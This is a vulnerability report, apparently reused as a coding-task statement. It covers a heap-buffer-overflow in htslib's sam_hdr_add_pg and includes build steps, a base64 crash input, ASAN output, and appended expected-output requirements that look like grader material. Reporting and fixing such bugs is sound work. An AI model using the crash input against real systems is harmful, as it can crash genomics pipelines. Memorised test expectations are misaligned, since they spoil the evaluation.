Heap overflow during `sam_hdr_add_pg`
# Summary

Heap-buffer overflow in `sam_hdr_add_pg` during parsing of a crafted SAM/FASTA file pair.

# Environment

Built using LLVM 14 with ASAN on Ubuntu 22.04

# How to reproduce

Build with ASAN on latest commit like so:

```
git clone --recursive https://github.com/samtools/htslib
cd htslib
autoreconf -i
CC=clang-14 CXX=clang++-14 CFLAGS="-fsanitize=address -g" CXXFLAGS="-fsanitize=address -g" LDFLAGS="-fsanitize=address -g" ./configure
make -j$(nproc)

git clone --recursive https://github.com/samtools/samtools
cd samtools
autoheader
autoconf -Wno-syntax
CC=clang-14 CXX=clang++-14 CFLAGS="-fsanitize=address -g -I$(pwd)/../htslib" CXXFLAGS="-fsanitize=address -g -I$(pwd)/../htslib" LDFLAGS="-fsanitize=address -g -L$(pwd)/../htslib" ./configure
make -j$(nproc)
```

Within the samtools folder, get poc file and reproduce with:

```
echo -ne "QFBHCUlEOjtHCVBQOjtHCVBQOlhHFjpYRxZJRDow" | base64 -d > poc
./samtools view -C -T ../htslib/test/c2.fa poc
```

Which on my setup outputs:

```
=================================================================
==11844==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60c000000260 at pc 0x55db3c3dd62f bp 0x7ffee0966730 sp 0x7ffee0966728
READ of size 8 at 0x60c000000260 thread T0
    #0 0x55db3c3dd62e in sam_hdr_add_pg /home/octavio/htslib/header.c:2301:62
    #1 0x55db3c181c7e in main_samview /home/octavio/samtools/sam_view.c:1236:17
    #2 0x55db3c202eed in main /home/octavio/samtools/bamtk.c:244:55
    #3 0x7f1de7429d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #4 0x7f1de7429e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #5 0x55db3c0a7b24 in _start (/home/octavio/samtools/samtools+0xb0b24) (BuildId: 7078ea94d4e08689f85e1df47e2d609c021d2440)

0x60c000000260 is located 32 bytes to the left of 128-byte region [0x60c000000280,0x60c000000300)
allocated by thread T0 here:
    #0 0x55db3c12ad96 in __interceptor_realloc (/home/octavio/samtools/samtools+0x133d96) (BuildId: 7078ea94d4e08689f85e1df47e2d609c021d2440)
    #1 0x55db3c3d5c2c in sam_hrecs_update_hashes /home/octavio/htslib/header.c:317:22
    #2 0x55db3c3c70bc in sam_hrecs_parse_lines /home/octavio/htslib/header.c:894:19
    #3 0x55db3c3c35e9 in sam_hdr_fill_hrecs /home/octavio/htslib/header.c:1133:13
    #4 0x55db3c3dc8ea in sam_hdr_add_pg /home/octavio/htslib/header.c:2238:13
    #5 0x55db3c181c7e in main_samview /home/octavio/samtools/sam_view.c:1236:17
    #6 0x55db3c202eed in main /home/octavio/samtools/bamtk.c:244:55
    #7 0x7f1de7429d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/octavio/htslib/header.c:2301:62 in sam_hdr_add_pg
Shadow bytes around the buggy address:
  0x0c187fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c187fff8000: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
  0x0c187fff8010: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa
  0x0c187fff8020: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c187fff8030: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
=>0x0c187fff8040: 00 00 00 00 00 00 00 00 fa fa fa fa[fa]fa fa fa
  0x0c187fff8050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c187fff8060: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c187fff8070: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c187fff8080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c187fff8090: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==11844==ABORTING
```

### Additional contract requirements

- When `sam_hdr_add_pg(header, "new_prog", NULL)` is called on a header with text `@HD\tVN:1.5\n@PG\tID:loop1\tPN:prog1\tPP:loop1\n`, it must return 0 and the resulting header text must be exactly:

```
@HD\tVN:1.5
@PG\tID:loop1\tPN:prog1\tPP:loop1
@PG\tID:new_prog\tPN:new_prog\tPP:loop1
```

When it is called on a header with text `@HD\tVN:1.5\n@PG\tID:loop1\tPN:prog1\tPP:loop2\n@PG\tID:loop2\tPN:prog2\tPP:loop1\n`, it must return 0 and the resulting header text must be exactly:

```
@HD\tVN:1.5
@PG\tID:loop1\tPN:prog1\tPP:loop2
@PG\tID:loop2\tPN:prog2\tPP:loop1
@PG\tID:new_prog\tPN:new_prog
```
